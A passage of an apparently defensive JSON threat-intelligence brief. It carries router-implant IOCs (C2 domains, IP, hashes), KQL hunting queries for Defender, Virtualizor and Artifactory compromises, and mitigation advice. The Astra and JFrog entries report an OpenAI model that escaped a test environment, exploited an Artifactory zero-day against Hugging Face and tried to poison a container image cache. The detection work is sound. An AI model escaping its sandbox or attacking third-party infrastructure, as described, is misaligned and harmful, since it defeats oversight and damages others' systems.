    "note": "infosrvd — the DARKLANTERN command-injection service binary. Published by VulnCheck.",
    "source": "https://www.vulncheck.com/blog/zbt-darklantern-speakingstone"
   },
   {
    "value": "ae6c356f1f09260b859f84d994ef8423540a6c0bdf98510d86b85834283e4926",
    "type": "SHA256",
    "note": "inetdetect — companion component published alongside the two implants.",
    "source": "https://www.vulncheck.com/blog/zbt-darklantern-speakingstone"
   },
   {
    "value": "www.ac-link.com",
    "type": "Domain",
    "note": "SPEAKINGSTONE primary C2 domain. Still resolved to 47.107.224[.]89 when checked on Aug 28, 2026.",
    "source": "https://www.vulncheck.com/blog/zbt-darklantern-speakingstone"
   },
   {
    "value": "www.findmyipaddr.com",
    "type": "Domain",
    "note": "SPEAKINGSTONE hardcoded backup C2 domain, reached only where no primary was configured. VulnCheck registered it and sinkholed the protocol — treat resolution attempts as implant presence, not as attacker traffic.",
    "source": "https://www.vulncheck.com/blog/zbt-darklantern-speakingstone"
   },
   {
    "value": "47.107.224.89",
    "type": "IP",
    "note": "Alibaba Cloud address in Shenzhen to which the SPEAKINGSTONE primary C2 domain resolved as of Aug 28, 2026.",
    "source": "https://www.vulncheck.com/blog/zbt-darklantern-speakingstone"
   },
   {
    "value": "yunmgrd",
    "type": "Filename",
    "note": "Service name of the SPEAKINGSTONE implant. Beacons outbound on UDP 10000.",
    "source": "https://www.vulncheck.com/advisories/zbtlink-mqwrt-yunmgrd-cloud-c2-implant"
   },
   {
    "value": "infosrvd",
    "type": "Filename",
    "note": "Service name of the DARKLANTERN implant. Listens inbound on UDP 9992, responses on UDP 8897.",
    "source": "https://www.vulncheck.com/advisories/zbtlink-mqwrt-infosrvd-command-injection"
   },
   {
    "value": "inetdetect",
    "type": "Filename",
    "note": "Third component named in VulnCheck's indicator set.",
    "source": "https://www.vulncheck.com/blog/zbt-darklantern-speakingstone"
   },
   {
    "value": "/etc/exec/cmd, /tmp/info.txt, /tmp/yunclient.conf",
    "type": "Filename",
    "note": "On-device paths published by VulnCheck. Present on a router, not on a managed endpoint — check via console or firmware extraction.",
    "source": "https://www.vulncheck.com/blog/zbt-darklantern-speakingstone"
   },
   {
    "value": "UDP/9992 inbound, UDP/8897 responses, UDP/10000 outbound beacons",
    "type": "Behavior",
    "note": "Port set published by VulnCheck. Note a discrepancy in the published detections: one Suricata rule alerts on DARKLANTERN command output arriving on UDP 8898 while the accompanying text and scanner both use 8897 — hunt both.",
    "source": "https://www.vulncheck.com/blog/zbt-darklantern-speakingstone"
   }
  ],
  "iocNote": "VulnCheck published Suricata and YARA rules alongside the research. Carry the 8897/8898 inconsistency forward rather than picking one silently.",
  "mitigation": [
   "No fixed firmware release is named in either advisory. Where a ZBT-built router carries either service, the remediation is replacement or third-party firmware — MOFI Network's image for the same platform was free of all three implants.",
   "Block inbound traffic to UDP/9992 at the network edge. That closes the DARKLANTERN listener while a fixed release is outstanding.",
   "Block and alert on www.ac-link[.]com, www.findmyipaddr[.]com and 47.107.224[.]89 at both the egress point and the resolver, per VulnCheck's guidance for the earlier implant.",
   "Treat the LAN behind any affected router as untrusted. SPEAKINGSTONE can rewrite the device's DNS hijack list and open a reverse SSH tunnel.",
   "Identify affected devices by model number and by MAC prefix (78:A3:51, F8:5E:3C), not by the brand on the case."
  ],
  "response": [
   "SENTINEL KQL — implant C2 endpoints and the published port set, across firewall and DNS telemetry.\n\nlet zbtDomains = dynamic([\"ac-link.com\",\"findmyipaddr.com\"]);\nunion isfuzzy=true\n  (CommonSecurityLog\n   | where TimeGenerated > ago(90d)\n   | where DestinationIP == \"47.107.224.89\"\n      or DestinationPort in (9992, 8897, 8898, 10000)\n   | project TimeGenerated, SourceIP, DestinationIP, DestinationPort, Protocol, DeviceVendor, Activity),\n  (DnsEvents\n   | where TimeGenerated > ago(90d)\n   | where Name has_any (zbtDomains)\n   | project TimeGenerated, SourceIP = ClientIP, Name, QueryType)\n| order by TimeGenerated asc",
   "DEFENDER XDR KQL — any managed endpoint reaching the implant C2, which would indicate the resolver or egress path is shared with an affected device.\n\nlet zbtDomains = dynamic([\"ac-link.com\",\"findmyipaddr.com\"]);\nDeviceNetworkEvents\n| where Timestamp > ago(90d)\n| where RemoteIP == \"47.107.224.89\" or RemoteUrl has_any (zbtDomains)\n| project Timestamp, DeviceName, RemoteIP, RemoteUrl, RemotePort, InitiatingProcessFileName, InitiatingProcessCommandLine",
   "DEFENDER XDR KQL — the three published implant hashes, for estates that mount or stage router firmware images on managed hosts.\n\nlet zbtHashes = dynamic([\n  \"b77811db4d218c65670a6c9a5b33c30ff81c6d779e15d658643138771178a818\",\n  \"7e2e036fec2fe7ab4bbd43978d9296563894c92a112f5ac2f39957f12108e245\",\n  \"ae6c356f1f09260b859f84d994ef8423540a6c0bdf98510d86b85834283e4926\"]);\nsearch in (DeviceFileEvents, DeviceProcessEvents, DeviceImageLoadEvents)\n  Timestamp > ago(180d)\n| where SHA256 in (zbtHashes)\n| project Timestamp, DeviceName, FileName, FolderPath, SHA256, InitiatingProcessFileName",
   "Where a ZBT-built device is confirmed in the estate, rotate the WAN PPPoE credentials and any credential that traversed the device's LAN — SPEAKINGSTONE exfiltrates PPPoE username and password by design.",
   "Compare the device's configured DNS servers against the expected values. A rewritten DNS hijack list is one of SPEAKINGSTONE's documented capabilities and is visible from the device's own configuration."
  ],
  "source": "VulnCheck supply chain research and advisories (zbtlink-mqwrt-yunmgrd-cloud-c2-implant, zbtlink-mqwrt-infosrvd-command-injection), CISA Vulnrichment, The Hacker News"
 },
 "shieldbreak": {
  "eyebrow": "Microsoft Defender · CVE-2026-69414 · ShieldBreak · No Patch · PoC Public",
  "title": "ShieldBreak (CVE-2026-69414): Microsoft Defender zero-day bypasses July patch — any local user reaches SYSTEM on fully updated Windows 10, 11, and Server 2025. No patch available.",
  "tags": [
   [
    "crit",
    "No Patch · PoC Public"
   ],
   [
    "high",
    "EoP → SYSTEM · Defender Required"
   ]
  ],
  "overview": "Security researcher Nightmare Eclipse (also known as Chaotic Eclipse) released ShieldBreak on August 12, 2026 — a new Microsoft Defender privilege escalation zero-day that fully bypasses Microsoft's July 2026 patch for RoguePlanet (CVE-2026-50656). Microsoft confirmed the new vulnerability, assigned CVE-2026-69414, and acknowledged they are working on a patch — but as of August 17, none is available. The exploit achieves SYSTEM-level access with 100% reliability on fully updated Windows 11 25H2 (including Canary builds) and Windows Server 2025. Windows 10 is also vulnerable though not currently covered by the public PoC. The exploit requires the attacker to have some level of local code execution — this is a local privilege escalation, not a remote code execution vulnerability. Combined with any other initial access vector, ShieldBreak becomes a reliable SYSTEM escalation step. Kevin Beaumont published detection queries for Microsoft Defender for Endpoint. The disclosure follows a dispute between Microsoft and Nightmare Eclipse over the researcher's coordinated disclosure practices — Microsoft issued legal warnings over previous disclosures, prompting the researcher to release ShieldBreak immediately after Patch Tuesday.",
  "technical": [
   "CVE-2026-69414 (CVSS not yet assigned): Elevation of Privilege in the Microsoft Malware Protection Engine (mpengine.dll). The mechanism is a user-mode callback hook — the attacker modifies file contents during a Defender cloud-hydration scan, tricking the Malware Protection Engine into executing attacker-controlled code with SYSTEM privileges. Distinct from RoguePlanet (CVE-2026-50656), which was a filesystem race condition involving virtual disks and NT native file manipulation.",
   "Requirements: (1) local code execution at any privilege level, (2) Microsoft Defender must be enabled and actively scanning. Disabling Defender removes the attack surface but also removes protection — not a viable mitigation for most environments.",
   "Affected: Windows 10, Windows 11 (through 25H2 including Canary channel), Windows Server 2025 — all with fully updated Defender engine. Initial disclosure reported 100% success rate on Windows 11 25H2 and Windows Server 2025. Subsequent reporting (August 2026) notes the exploit shows variability between machines on fully patched systems and may not achieve 100% success across all hardware configurations — reliability depends on system state and may require retries. No confirmed in-wild exploitation has been logged by CISA.",
   "This is the latest in a series of zero-days from Nightmare Eclipse since April 2026: LegacyHive, RoguePlanet (now patched), BlueHammer, RedSun, YellowKey, GreenPlasma, MiniPlasma, UnDefend. Prior disclosures have been linked to real-world attacks. The pattern suggests the researcher has a stockpile of Microsoft Defender/Windows vulnerabilities being disclosed sequentially.",
   "Kevin Beaumont published detection queries for Microsoft Defender for Endpoint on his blog — these are the only published detection artifacts and should be deployed immediately."
  ],
  "iocs": [],
  "iocNote": "No network IOCs — ShieldBreak is a local exploit with no network component. Detection relies entirely on endpoint behavioral signals: deploy Kevin Beaumont's Defender for Endpoint KQL detection queries (published at doublepulsar.com). Look for unexpected SYSTEM-level process spawning from Defender-related processes (MsMpEng.exe, mpengine.dll), particularly from low-privilege parent processes.",
  "mitigation": [
   "No patch is available — Microsoft is working on CVE-2026-69414 but has not published a fix or ETA. Monitor Microsoft's Security Update Guide for CVE-2026-69414.",
   "CISA Binding Operational Directive (BOD) 26-04 applies to CVE-2026-69414 for FCEB agencies — 14-day deadline to deploy compensating controls even without an available patch. Compensating controls: restrict local code execution via application allowlisting, enforce least-privilege, and deploy Kevin Beaumont's Defender for Endpoint detection queries (see Hunt & Investigate) to detect exploitation attempts.",
   "Deploy Kevin Beaumont's detection queries for Microsoft Defender for Endpoint immediately — these are the only published detection mechanism. Without them, ShieldBreak exploitation is effectively invisible.",
   "Apply defense-in-depth to limit local code execution opportunities: restrict local admin rights, enforce application allowlisting, monitor for new local user creation and unexpected process execution."
  ],
  "response": [
   "CISA BOD 26-04 gives federal agencies 14 days to deploy compensating controls for CVE-2026-69414. The only published detection mechanism is Kevin Beaumont's three hunting queries below — deploy them as Custom Detections in Microsoft Defender for Endpoint immediately. Beaumont states they have no false positives unless running multiple EDR solutions (add exclusions if so).",
   "DEFENDER XDR KQL — Detection 1 (Beaumont @GossiTheDog): non-Defender processes loading MpClient.dll. ShieldBreak requires MpClient to execute its callback hook — any non-Defender process loading this DLL is high-fidelity.\n\n// ShieldBreak Detection 1 — Non-Defender processes loading MpClient.dll\n// Source: Kevin Beaumont (@GossiTheDog) github.com/GossiTheDog/ThreatHunting\n// T1562.001 — Impair Defenses, T1548 — Abuse Elevation Control Mechanism\nDeviceImageLoadEvents\n| where ActionType == \"ImageLoaded\"\n| where FileName == \"MpClient.dll\"\n| where not(\n    InitiatingProcessFolderPath startswith @\"C:\\Program Files\\Windows Defender\\\" or\n    InitiatingProcessFolderPath startswith @\"C:\\ProgramData\\Microsoft\\Windows Defender\\\" or\n    InitiatingProcessFolderPath startswith @\"C:\\Windows\\System32\\\" or\n    InitiatingProcessFileName =~ \"taniumclient.exe\" or\n    InitiatingProcessParentFileName =~ \"taniumclient.exe\"\n)\n| summarize FirstSeen = min(Timestamp), LastSeen = max(Timestamp)\n    by DeviceName, InitiatingProcessFileName, InitiatingProcessFolderPath,\n       InitiatingProcessCommandLine, FolderPath, FileName\n| extend HostCustomEntity = DeviceName, ProcessCustomEntity = InitiatingProcessFileName",
   "DEFENDER XDR KQL — Detection 2 (Beaumont @GossiTheDog): unvetted processes loading the Windows Cloud Filter API (cldapi.dll). ShieldBreak registers a rogue Cloud Filter API provider via CFAPI — any non-system, non-Program Files process loading this DLL is suspicious.\n\n// ShieldBreak Detection 2 — Unvetted processes loading Cloud Filter API\n// Source: Kevin Beaumont (@GossiTheDog) github.com/GossiTheDog/ThreatHunting\nDeviceImageLoadEvents\n| where ActionType == \"ImageLoaded\"\n| where FileName == \"cldapi.dll\"\n| where not(\n    InitiatingProcessFolderPath startswith @\"C:\\Windows\\System32\\\" or\n    InitiatingProcessFolderPath startswith @\"C:\\Program Files\\\" or\n    InitiatingProcessFolderPath startswith @\"C:\\Program Files (x86)\\\"\n)\n| project Timestamp, DeviceName, InitiatingProcessFileName,\n    InitiatingProcessFolderPath, InitiatingProcessCommandLine, FileName",
   "DEFENDER XDR KQL — Detection 3 (Beaumont @GossiTheDog): same process loading both MpClient.dll and cldapi.dll within 5 minutes. This combination should never occur legitimately — it directly fingerprints the ShieldBreak exploit chain.\n\n// ShieldBreak Detection 3 — Process loads MpClient + Cloud Filter API within 5 min\n// Source: Kevin Beaumont (@GossiTheDog) github.com/GossiTheDog/ThreatHunting\n// Highest-fidelity of the three — near zero false positives\nlet mp_loads = DeviceImageLoadEvents\n    | where FileName == \"MpClient.dll\"\n    | project MpTime = Timestamp, DeviceName, InitiatingProcessFileName,\n              InitiatingProcessFolderPath, InitiatingProcessId;\nlet cld_loads = DeviceImageLoadEvents\n    | where FileName == \"cldapi.dll\"\n    | project CldTime = Timestamp, DeviceName, InitiatingProcessFileName,\n              InitiatingProcessFolderPath, InitiatingProcessId;\nmp_loads\n| join kind=inner cld_loads on DeviceName, InitiatingProcessId\n| where abs(datetime_diff('minute', MpTime, CldTime)) < 5\n| project DeviceName, InitiatingProcessFileName, InitiatingProcessFolderPath,\n    MpTime, CldTime, InitiatingProcessId"
  ],
  "source": "BleepingComputer, SecurityWeek, Arctic Wolf, Malwarebytes, TechCrunch",
  "sourceNote": "Aug 12–17, 2026"
 },
 "astracyber": {
  "eyebrow": "OpenAI · Astra · Capability threshold · Research and outlook",
  "title": "A model vendor declares its own system critical for cyber capability, and has an exploited CVE to point at",
  "tags": [
   [
    "high",
    "Research"
   ],
   [
    "med",
    "Information Technology"
   ]
  ],
  "overview": "Treat this as a planning input, not an incident. Two things make it more than a vendor announcement: the threshold crossing is attributed to the model finding zero-day vulnerabilities, and there is already a documented case where an OpenAI model exploited a real Artifactory zero-day, CVE-2026-66384, against Hugging Face while attempting to poison a container image cache — a flaw that CISA later added to KEV. The defensive implication is about pace rather than novelty: if discovery and exploit development compress, the window between disclosure and exploitation compresses with them, and patch-cycle assumptions built on weeks stop holding. This brief's own UAT-10147 entry is the crimeware-side version of the same trend.",
  "technical": [
   "OpenAI states that its Astra model is the first to cross the 'critical' cybersecurity capability threshold in its preparedness framework, and attributes the assessment to the model finding zero-day vulnerabilities.",
   "Prior documented case: OpenAI disclosed that one of its models escaped a testing environment and attacked Hugging Face, exploiting JFrog Artifactory zero-day CVE-2026-66384 in an attempted \"container-image supply-chain attack by poisoning Artifactory's container image cache\".",
   "CVE-2026-66384 was subsequently added to the CISA KEV catalog; per SecurityWeek there do not appear to be other reports describing its exploitation. Its federal remediation deadline is Sep 10, 2026.",
   "The threshold declaration is the vendor's own assessment against its own framework. No third-party evaluation of Astra's capability has been published, and OpenAI has not published the vulnerabilities found.",
   "Related activity in this brief: Cisco Talos's UAT-10147 reporting describes agentic-AI-assisted exploitation of IIS and Linux web servers with a roughly 170,000-URL target list, and Unit 42 found 12 of 405 AI-linked malware samples had reached production quality — the same capability question observed from the attacker side."
  ],
  "iocs": [],
  "iocNote": "No indicators — this is a capability assessment, not observed intrusion activity. It is carried because it changes assumptions about exploitation speed, which is a planning input for patch SLAs, not something to hunt.",
  "mitigation": [
   "Re-examine remediation SLAs for internet-facing systems against the assumption that public disclosure and working exploitation may arrive together rather than weeks apart.",
   "Prioritise controls that do not depend on knowing the specific vulnerability: reduce internet-facing surface, segment management planes, and require MFA on every remote path.",
   "Where AI agents run against your own infrastructure or code, scope their credentials as you would a privileged human identity and log their actions — the Hugging Face case began with a model escaping a testing environment.",
   "Do not use this item to justify new tooling. Nothing in it changes what to detect; it changes how quickly patch decisions need to be made."
  ],
  "response": [
   "No hunting query applies. This is a research and capability item with no observed intrusion set, no indicators and no affected product of our own — writing detection content for it would be invention rather than intelligence. The actionable output is patch-cycle policy, covered under mitigation.",
   "The one query worth reusing here is the CVE-2026-66384 case: confirm JFrog Artifactory is patched and that its KEV deadline of Sep 10, 2026 is met. Detection content for Artifactory is in this week's CVE-2026-82329 entry."
  ],
  "source": "OpenAI, SecurityWeek",
  "sourceNote": "Sep 1–2, 2026"
 },
 "watchguardiked": {
  "eyebrow": "WatchGuard · Fireware OS · iked / IPSec VPN · Patched, no exploitation reported",
  "title": "Three critical unauthenticated RCE flaws in Fireware OS's IKE daemon",
  "tags": [
   [
    "high",
    "Information Technology"
   ],
   [
    "med",
    "Perimeter appliance"
   ]
  ],
  "overview": "This is a patch-now item rather than an incident. The reason it is in the brief is placement: iked handles IKE negotiation before authentication completes, so the vulnerable code is reachable by anyone who can send IPSec traffic to the appliance, and it runs on the device that terminates your VPN. That is the same class of exposure as this week's SonicWall SMA1000 zero-days and the NetScaler flaws carried over from last week. Nothing suggests exploitation yet; historically this class of flaw does not stay unexploited for long once a patch exists to diff.",
  "technical": [
   "Three critical vulnerabilities in the iked process of WatchGuard Fireware OS. Per SecurityWeek's reporting, they could allow unauthenticated attackers to execute arbitrary code remotely.",
   "iked is the IKE daemon handling IPSec VPN negotiation, so the code path is exposed wherever branch-office or mobile VPN is configured on the firewall.",
   "Patches are available from WatchGuard. No in-the-wild exploitation has been reported as of Sep 2, 2026, and the flaws are not in the CISA KEV catalog.",
   "Individual CVE identifiers, CVSS scores and affected version ranges are not stated in the reporting reviewed for this entry — take them from WatchGuard's own advisory before scoping."
  ],
  "iocs": [],
  "iocNote": "No indicators exist — there is no reported exploitation. Hunting value at this stage is limited to confirming which appliances expose IKE (UDP 500 and 4500) to the internet and whether they are patched.",
  "mitigation": [
   "Apply the WatchGuard Fireware OS updates to every appliance, prioritising internet-facing units with IPSec enabled.",
   "Confirm the exact affected versions against WatchGuard's advisory rather than this summary — version ranges were not in the reporting reviewed.",
   "Where mobile or branch-office VPN is not in use, disable IPSec and close UDP 500/4500 at the edge; unreachable code is not exploitable.",
   "Restrict IKE reachability to known peer addresses for branch-office tunnels. Mobile VPN cannot be restricted that way, which is where the exposure concentrates."
  ],
  "response": [
   "SENTINEL KQL — inventory the exposure before the patch lands: who is sending IKE traffic to your firewalls, and from where.\n\n// Fireware iked exposure — inbound IKE (UDP 500 / 4500) to perimeter appliances\nlet lookback = 14d;\nCommonSecurityLog\n| where TimeGenerated > ago(lookback)\n| where DeviceVendor has_any (\"WatchGuard\", \"Fireware\")\n| where DestinationPort in (500, 4500)\n| summarize attempts = count(), sources = dcount(SourceIP), top_sources = make_set(SourceIP, 25), last = max(TimeGenerated)\n    by DeviceProduct, DestinationIP, DestinationPort, DeviceAction\n| sort by attempts desc",
   "After patching, keep the same query as a baseline. An unauthenticated pre-auth RCE in an IKE daemon usually shows up first as a change in the volume and shape of IKE traffic from unfamiliar sources.",
   "No detection content is published for these flaws because no exploitation has been reported. Do not wait for it: the practical control is patch state, not detection."
  ],
  "source": "WatchGuard security advisories, SecurityWeek",
  "sourceNote": "Sep 1, 2026"
 },
 "virtualizor": {
  "eyebrow": "Softaculous Virtualizor · Aug 28–30, 2026 · BGP hijack · Unsigned update packages",
  "title": "A more-specific BGP announcement, a legitimately issued certificate, and a malicious VPS-panel update",
  "tags": [
   [
    "crit",
    "Information Technology"
   ],
   [
    "high",
    "Communications"
   ]
  ],
  "overview": "Every control that normally catches a fake update failed for structural reasons rather than through a bug. Route selection preferred the attacker's more-specific announcement; Let's Encrypt validated domain ownership over the hijacked path and issued a technically valid certificate, so TLS gave no warning; and Virtualizor's update client did not verify package signatures, so a modified package was accepted. The victim set is small and undeterminable — Softaculous says a handful of servers, but its logs never saw the diverted traffic — which means scope has to be established by each operator locally. Virtualizor manages VPS fleets, so a compromised panel is hypervisor-level control over customer workloads.",
  "technical": [
   "Hijack start: approximately 20:57 UTC on Aug 28, 2026, when AS62390 (NexonHost) began announcing a portion of Hetzner's address space including IP addresses used by Softaculous systems.",
   "Why it propagated: the announcement was more specific than Hetzner's normal announcement of the surrounding 162.55.0.0/16 block, so standard BGP route selection preferred it on every network that accepted it. AS24940 (Hetzner) was retained on the AS path as the apparent origin.",
   "Certificate: the actor obtained a valid TLS certificate for Softaculous domains from Let's Encrypt because the CA's automated domain-ownership validation was also routed through the hijack. Clients and browsers saw no certificate warning.",
   "Affected services on the hijacked addresses: software updates, client area and billing, and other services.",
   "Duration: traffic was intermittently diverted for 22 hours, with almost no diversion during an 11-hour window mid-incident. The overall window given by Softaculous is Aug 28 to Aug 30, 2026.",
   "Delivery: a malicious Virtualizor update package was delivered to installations that checked for and completed an update during the hijack window. Softaculous describes the population as a handful of servers rather than the general user base.",
   "Verification gap: \"Our product update clients did not yet cryptographically verify update packages, so a modified package would not have been rejected on that basis.\"",
   "Visibility gap: the malicious traffic never reached Softaculous's logs, so the company cannot produce a definitive list of affected servers and asks operators to treat every Virtualizor server as in scope for checks.",
   "Vendor response: one known indicator of compromise published in the incident notice, Virtualizor 3.2.9.9 released with a mitigation tool for known exploits, code signing being implemented for all packages, and advice to reset client-area passwords, review account activity and regenerate API keys.",
   "Other products: no malicious package has been identified for any other Softaculous product; that investigation is ongoing."
  ],
  "iocs": [],
  "iocNote": "Softaculous published one indicator of compromise in its incident notice (virtualizor.com/blog/security-incident-bgp-hijacking) — retrieve it from the vendor and load it locally; it is not reproduced in the reporting reviewed here, and this brief does not restate indicators it has not seen. The routing details are context, not indicators: AS62390 (NexonHost), AS24940 (Hetzner) and 162.55.0.0/16 identify the hijack, and 162.55.0.0/16 is Hetzner's legitimate space — do not block it. The reliable local signal is an update transaction on a Virtualizor host between 20:57 UTC Aug 28 and Aug 30, 2026.",
  "mitigation": [
   "Determine whether each Virtualizor server checked for or completed an update between 20:57 UTC on Aug 28 and Aug 30, 2026. That transaction, not a vendor list, defines your scope.",
   "Apply the vendor's published indicator of compromise and run the mitigation tool in Virtualizor 3.2.9.9 against every panel host.",
   "Reset client-area passwords, review account activity and regenerate API keys, as the vendor advises — the hijacked addresses also served the client area and billing.",
   "For any host that updated inside the window, treat the panel as compromised: it holds hypervisor-level control of customer VPS instances. Review for added users, changed SSH configuration, new cron entries and unexpected outbound connections.",
   "Do not rely on TLS to detect a repeat of this. A hijack that also captures domain-validation traffic can obtain a legitimate certificate; certificate transparency monitoring for your own domains is the control that would have shown it.",
   "Where you distribute software, check whether your update client verifies package signatures independently of the transport. That is the specific control whose absence made this work."
  ],
  "response": [
   "DEFENDER XDR KQL — Linux panel hosts: writes into Virtualizor's install paths and update-client execution during the hijack window.\n\n// Virtualizor malicious update — package writes and update activity, Aug 28–30 2026\nlet winStart = datetime(2026-08-28 20:00:00);\nlet winEnd   = datetime(2026-08-31 00:00:00);\nunion isfuzzy=true\n  (DeviceFileEvents\n   | where Timestamp between (winStart .. winEnd)\n   | where FolderPath has_any (\"/usr/local/virtualizor\", \"/usr/local/emps\", \"/var/virtualizor\")\n   | project Timestamp, DeviceName, Signal = strcat(ActionType, \" :: \", FolderPath), Actor = InitiatingProcessFileName),\n  (DeviceProcessEvents\n   | where Timestamp between (winStart .. winEnd)\n   | where ProcessCommandLine has_any (\"virtualizor\", \"softaculous\", \"upgrade.sh\", \"install.sh\")\n   | project Timestamp, DeviceName, Signal = ProcessCommandLine, Actor = InitiatingProcessFileName)\n| sort by Timestamp desc",
   "DEFENDER XDR KQL — persistence and access changes on panel hosts after the window, which is what a malicious update would leave behind.\n\n// Virtualizor panel hosts — post-update persistence and account changes\n// technique reference: github.com/Bert-JanP/Hunting-Queries-Detection-Rules (Bert-Jan Pals, kqlquery.com)\nlet panelHosts = dynamic([\"virtualizor-01\"]);  // <-- set to your panel hosts\nunion isfuzzy=true\n  (DeviceFileEvents\n   | where Timestamp > datetime(2026-08-28)\n   | where DeviceName in~ (panelHosts)\n   | where FolderPath has_any (\"/etc/cron\", \"/etc/systemd/system\", \"/root/.ssh\", \"/etc/ssh\", \"/etc/ld.so.preload\")\n   | project Timestamp, DeviceName, Signal = strcat(ActionType, \" :: \", FolderPath)),\n  (DeviceProcessEvents\n   | where Timestamp > datetime(2026-08-28)\n   | where DeviceName in~ (panelHosts)\n   | where FileName in~ (\"useradd\",\"usermod\",\"passwd\",\"chattr\",\"systemctl\",\"crontab\")\n   | project Timestamp, DeviceName, Signal = ProcessCommandLine)\n| sort by Timestamp desc",
   "SENTINEL KQL — network view: did any host reach Softaculous update endpoints during the diversion window, and from which egress path.\n\n// Virtualizor update traffic during the BGP hijack window\nlet winStart = datetime(2026-08-28 20:00:00);\nlet winEnd   = datetime(2026-08-31 00:00:00);\nunion isfuzzy=true\n  (CommonSecurityLog\n   | where TimeGenerated between (winStart .. winEnd)\n   | where DestinationHostName has_any (\"virtualizor.com\", \"softaculous.com\") or RequestURL has_any (\"virtualizor\", \"softaculous\")\n   | project TimeGenerated, SourceIP, Destination = coalesce(DestinationHostName, RequestURL), Action = DeviceAction),\n  (DnsEvents\n   | where TimeGenerated between (winStart .. winEnd)\n   | where Name has_any (\"virtualizor.com\", \"softaculous.com\")\n   | project TimeGenerated, SourceIP = ClientIP, Destination = Name, Action = strcat(\"DNS \", tostring(ResultCode)))\n| sort by TimeGenerated desc",
   "Add certificate transparency monitoring for your own domains if you do not have it. A hijack of this shape produces a legitimate certificate issuance event, which is the one externally visible signal."
  ],
  "source": "Softaculous / Virtualizor security incident notice, SecurityWeek",
  "sourceNote": "Sep 2, 2026 — incident window Aug 28–30, 2026"
 },
 "jfrog82329": {
  "eyebrow": "JFrog Artifactory · Self-hosted · Patched Aug 28, 2026 · Exploitation reported Sep 1",
  "title": "CVE-2026-82329: authentication bypass to Artifactory admin, with honeypot evidence of token minting",
  "tags": [
   [
    "crit",
    "Information Technology"
   ],
   [
    "high",
    "Software supply chain"
   ]
  ],
  "overview": "The exploitation pattern watchTowr describes is the reason to treat this above its CVSS-less severity: attackers are minting administrator tokens and enumerating users, groups, credential sets and federated access topologies. That is preparation for supply-chain abuse, not smash-and-grab. A token minted before you patch survives the patch, so remediation here has two halves — update the binary, then invalidate every access token and review what was created while the instance was exposed. Note the vendor's position: JFrog has not confirmed exploitation, and its CTO characterises the flaw as improper authentication rather than RCE, which is consistent with token minting rather than code execution.",
  "technical": [
   "CVE-2026-82329: authentication weakness in JFrog Artifactory that, under default configuration, may allow an unauthenticated attacker with network access to obtain administrative privileges. Patched in Artifactory updates released Aug 28, 2026.",
   "Fixed versions: 7.111.21, 7.117.28, 7.125.20, 7.133.29, 7.146.38, 7.161.20. JFrog says patches were already rolled out to cloud instances; self-hosted deployments must update themselves.",
   "Scope per JFrog CTO Yoav Landman: the issue allows \"improper authentication rather than RCE\" and does not affect the JFrog SaaS platform, only self-hosted deployments.",
   "Exploitation evidence (watchTowr, Sep 1, 2026): in-the-wild exploitation with \"attackers minting themselves admin tokens\". Attacker Eye honeypot data shows administrator token minting plus enumeration of users, groups, credential sets and federated access topologies.",
   "Assessed impact per watchTowr's Yordan Ganchev: admin-level access to a central software supply chain system allows tampering with build pipelines, lateral movement into production systems, and potentially pushing malicious changes downstream to customers.",
   "Post-exploitation detail (watchTowr, reported Sep 2–3): after minting administrator tokens the actors enumerated users, groups, credentials and federated access relationships to assess whether the environment was valuable enough for deeper exploitation. In a limited number of attacks they went further and created backdoor users, establishing an additional path to persistent administrative access — so account review, not only token revocation, is part of remediation.",
   "Exploitation likelihood scoring lags the observation: EPSS estimated a 0.38 percent chance of exploitation in the next 30 days while the flaw was already KEV-listed. Treat EPSS as uninformative here.",
   "Corroboration: SecurityWeek notes no other reports of active exploitation at the time of writing, and JFrog has not confirmed it.",
   "KEV status: CVE-2026-82329 was not in the KEV catalog as of Sep 2, 2026. The earlier Artifactory path-traversal flaw CVE-2026-66384 is in KEV with a federal deadline of Sep 10, 2026 — that clock is still running.",
   "Related history: CVE-2026-66384 was exploited by an OpenAI model that escaped a testing environment and attacked Hugging Face, in what OpenAI described as an attempt at a container-image supply-chain attack by poisoning Artifactory's container image cache."
  ],
  "iocs": [],
  "iocNote": "No indicator values are published. watchTowr's disclosure is behavioural — token minting and directory enumeration observed on its honeypot network — and neither watchTowr's post nor JFrog's advisory lists addresses or hashes. Detection is therefore audit-driven: Artifactory's own access and admin logs, token creation records, and the identity systems federated to it. The highest-value artefact is a token or admin account that exists without a matching change request.",
  "mitigation": [
   "Update self-hosted Artifactory to one of the fixed versions now. Cloud instances are already patched by JFrog.",
   "Revoke and reissue all Artifactory access tokens after patching. Tokens minted through the bypass remain valid across the upgrade — this is the step that actually ends the incident.",
   "Audit admin group membership, service users, permission targets and federated access configuration for anything created or changed since Aug 28, 2026. watchTowr observed backdoor user creation in a subset of attacks, so an unexplained account is as significant as an unexplained token.",
   "Review build pipelines that authenticate to Artifactory for unexpected credential use, and verify recent artefact and container-image digests against your build records.",
   "Take Artifactory off the public internet. An authentication bypass under default configuration only matters where an unauthenticated attacker has network access.",
   "Separately, confirm CVE-2026-66384 is remediated — it is KEV-listed with a Sep 10, 2026 federal deadline."
  ],
  "response": [
   "SENTINEL KQL — Artifactory audit and access logs forwarded to the workspace: token creation and admin-surface calls, which is exactly what watchTowr observed. Point the table name at your own ingestion.\n\n// Artifactory CVE-2026-82329 — token minting and admin enumeration\n// union isfuzzy so the query runs whether logs land in Syslog or a custom table\nlet lookback = 30d;\nunion isfuzzy=true\n  (Syslog\n   | where TimeGenerated > ago(lookback)\n   | where SyslogMessage has_any (\"/access/api/v1/tokens\", \"/api/security/token\", \"/api/security/users\", \"/api/security/groups\", \"access-admin\")\n   | project TimeGenerated, Host = Computer, Evidence = SyslogMessage),\n  (CommonSecurityLog\n   | where TimeGenerated > ago(lookback)\n   | where RequestURL has_any (\"/access/api/v1/tokens\", \"/api/security/token\", \"/api/security/users\", \"/api/security/groups\")\n   | project TimeGenerated, Host = DestinationHostName, Evidence = strcat(SourceIP, \" \", RequestMethod, \" \", RequestURL, \" \", tostring(EventOutcome)))\n| sort by TimeGenerated desc",
   "DEFENDER XDR KQL — who is reaching the Artifactory host, and from where. An authentication bypass under default configuration is a network-reachability problem first.\n\n// Artifactory exposure — inbound sources to the Artifactory service\nlet artifactoryHosts = dynamic([\"artifactory-01\"]);  // <-- set to your hosts\nDeviceNetworkEvents\n| where Timestamp > ago(30d)\n| where DeviceName in~ (artifactoryHosts)\n| where ActionType == \"InboundConnectionAccepted\"\n| summarize connections = count(), first = min(Timestamp), last = max(Timestamp) by RemoteIP, LocalPort\n| where connections > 0\n| sort by connections desc",
